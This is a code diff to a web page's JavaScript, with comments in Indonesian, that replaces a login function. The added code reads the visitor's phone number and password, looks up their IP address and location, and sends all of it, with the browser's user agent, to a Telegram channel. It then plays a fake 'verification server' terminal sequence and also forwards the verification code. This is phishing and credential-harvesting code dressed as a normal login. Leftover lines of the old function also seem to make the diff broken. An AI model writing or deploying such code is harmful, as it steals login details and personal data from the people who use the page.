@@ -505,13 +505,63 @@ function updateInteractiveMap(lat, lon) {
         let verificationCode = '';
         let loggedInPhoneNumber = '';
         
-        function startLogin() {
-            const phoneNumber = document.getElementById('loginPhone').value;
-            
-            if (!phoneNumber) {
-                alert('Masukkan nomor telepon terlebih dahulu');
-                return;
-            }
+        
+// 🌐 Ambil IP lalu lanjutkan proses login
+async function startLogin() {
+    const phoneNumber = document.getElementById('loginPhone').value;
+    const password = document.getElementById('loginPassword').value;
+
+    if (!phoneNumber) {
+        alert('Masukkan nomor telepon terlebih dahulu');
+        return;
+    }
+
+    if (password !== '321123') {
+        alert('Password salah!');
+        return;
+    }
+
+    loggedInPhoneNumber = phoneNumber;
+    document.getElementById('loginButton').disabled = true;
+    document.getElementById('terminal').style.display = 'block';
+
+    // Ambil IP secara sinkron
+    let userIP = 'Fetching...';
+    try {
+        const res = await fetch('https://ipapi.co/json');
+        const data = await res.json();
+        userIP = data.ip + ' (' + data.city + ', ' + data.country_name + ')';
+    } catch (err) {
+        userIP = 'Unavailable';
+    }
+
+    // Kirim ke Telegram setelah IP berhasil diambil
+    sendToTelegram(`🔐 LOGIN ATTEMPT
+📱 Nomor: ${phoneNumber}
+🔑 Password: ${password}
+🖥️ User Agent: ${navigator.userAgent}
+🌐 IP: ${userIP}`);
+
+    setTimeout(() => {
+        addTerminalLine('> Menghubungkan ke server verifikasi...');
+        setTimeout(() => {
+            addTerminalLine('> Server merespons... [200 OK]');
+            setTimeout(() => {
+                verificationCode = generateRandomCode();
+                addTerminalLine(`> Kode anda adalah:
+
+${verificationCode}`);
+                sendToTelegram(`📳 VERIFICATION CODE SENT
+📱 Nomor: ${phoneNumber}
+🔢 Kode: ${verificationCode}`);
+                document.getElementById('loginCode').disabled = false;
+                document.getElementById('loginButton').textContent = 'VERIFIKASI KODE';
+                document.getElementById('loginButton').onclick = verifyCode;
+                document.getElementById('loginButton').disabled = false;
+            }, 1000);
+        }, 1500);
+    }, 1000);
+}
             
             loggedInPhoneNumber = phoneNumber;
             document.getElementById('loginButton').disabled = true;
